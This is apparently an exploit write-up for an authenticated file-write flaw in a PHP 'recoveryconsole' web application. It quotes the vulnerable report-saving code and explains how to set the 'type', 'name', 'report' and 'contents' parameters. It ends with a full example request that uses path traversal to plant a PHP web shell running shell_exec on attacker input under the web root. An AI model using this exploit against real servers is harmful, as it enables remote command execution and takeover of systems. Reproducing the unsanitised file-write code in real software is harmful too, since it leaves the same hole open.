Details:

Need a valid session. Login to /recoveryconsole and get an auth string. You can open a file anywhere the webserver has access to (user is apache). 

Variables:
name: For webshells, do ../ all the way to server root (/), then go to /var/www/html/tempPDF/file_prefix
contents: file contents you wish to upload
report: extension of file
type: the action switch to get where we need to. MUST BE SET TO file

Vulnerable Code:

---------------------------------------------------|
From /var/www/html/recoveryconsole/bpl/header.php  |
---------------------------------------------------|
// Get authentication cookie.
$authentication_cookie = isset($_REQUEST['auth']) ? $_REQUEST['auth'] : "";
// The action is the operation the user is taking.
$action = isset($_REQUEST['type']) ? $_REQUEST['type'] : "list";

---------------------------------------------------|
From /var/www/html/recoveryconsole/bpl/reports.php |
---------------------------------------------------|
// variable action from header.php
...
switch($action)
case "file":
if (isset($_GET['report']) && isset($_REQUEST['contents'])) {
        $reportType = $_GET['report'];
        $contents = $_REQUEST['contents'];
}
...
$baseName = isset($_GET['name']) ? $_GET['name'] : 'report';
$reportDirectory = $BP->get_ini_value("Location Information", "Reports-Dir");
if ($reportDirectory === false) {
        // Since we are not erroring out, log in the error log.
        // Use the default value /usr/bp/logs.dir.
        global $Log;
        $message = $BP->getError() . " - Error retrieving ini field: Location Information, Report-Dir, using default (/usr/bp/re
ports.dir).";
        $Log->writeError($message, true);
        $reportDirectory = "/usr/bp/reports.dir";
}
$fileName = createReportName($baseName, $reportDirectory, $reportType);
$bSuccessful = saveReport($fileName, $contents);
if ($bSuccessful === true) {
        $xml->push("root");
        $xml->element("ReportFile", $fileName);
        $xml->pop();
} else {
        $errorString = "Error saving report file '" . $fileName . "'.";
        $BP->buildResult($xml, false, $errorString);
}
echo($xml->getXml());
break;

...

// This function returns a name of a report (the CSV file) based on the type of report and date/time.
//
function createReportName($baseName, $directory, $type)
{
        $sName = $directory . '/' . $baseName;
        $timestamp = time();
        $date = date('mdy-His', $timestamp);
        
        $sName .= $date . '.' . $type;
        
        return $sName;
}

//
// This function saves the contents of the report to the file and returns
// true if successful and false if not.
//
function saveReport($file, $contents)
{
        $bSuccessful = false;
        $fp = fopen($file, 'w+');
        if ($fp !== false) {
                fwrite($fp, $contents);
                fclose($fp);
                $bSuccessful = true;
        }
        return $bSuccessful;
}

Example Request:

https://10.10.10.89/recoveryconsole/bpl/reports.php?type=file&report=php&name=../../../../../../../../var/www/html/tempPDF/rsl&contents=<?php echo shell_exec($_GET['e']); ?>&auth=djA6MjI2ZjYyYTItMWFlNy00MDM4LTkxZTctODkxOGFmMjQ2YjYxOjE6L3Vzci9icC9sb2dzLmRpci9ndWlfcm9vdC5sb2c6MA%3D%3D

